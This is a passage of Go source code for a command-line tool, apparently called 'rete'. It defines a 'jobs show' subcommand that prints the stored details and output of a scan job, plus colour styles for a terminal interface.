					j.ID, j.Status, j.Command, j.Target, j.CreatedAt.Format("2006-01-02 15:04:05"))
			}
			_, _ = fmt.Fprintln(w)
			return nil
		},
	}
	cmd.Flags().IntVarP(&limit, "limit", "l", 20, "Maximum number of jobs to show")
	return cmd
}

func newJobsShowCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:     "show [job-id]",
		Short:   "Show details for a specific scan job",
		Example: "  rete jobs show 7",
		Args:    cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			var id uint
			if _, err := fmt.Sscanf(args[0], "%d", &id); err != nil || id == 0 {
				return fmt.Errorf("invalid job ID %q: must be a positive integer", args[0])
			}
			job, err := db.GetJobByID(id)
			if err != nil {
				return fmt.Errorf("job %d not found: %w", id, err)
			}
			w := cmd.OutOrStdout()
			_, _ = fmt.Fprintf(w, "  Job #%d\n", job.ID)
			_, _ = fmt.Fprintf(w, "  Command : %s\n", job.Command)
			_, _ = fmt.Fprintf(w, "  Target  : %s\n", job.Target)
			_, _ = fmt.Fprintf(w, "  Args    : %s\n", job.Args)
			_, _ = fmt.Fprintf(w, "  Status  : %s\n", job.Status)
			_, _ = fmt.Fprintf(w, "  Created : %s\n", job.CreatedAt.Format("2006-01-02 15:04:05"))
			if len(job.Results) > 0 {
				_, _ = fmt.Fprintln(w, "\n  Output:")
				for _, r := range job.Results {
					prefix := "  "
					if r.IsError {
						prefix = "! "
					}
					_, _ = fmt.Fprintf(w, "    %s%s\n", prefix, r.Output)
				}
			}
			_, _ = fmt.Fprintln(w)
			return nil
		},
	}
	return cmd
}

//-----------------------------------------TUI styles---------------------------------------------------//

var (
	styleBanner = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("12"))

	styleCategory = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("11"))

	styleFeature = lipgloss.NewStyle().
			Foreground(lipgloss.Color("7"))

	styleHelp = lipgloss.NewStyle().
			Foreground(lipgloss.Color("8"))
)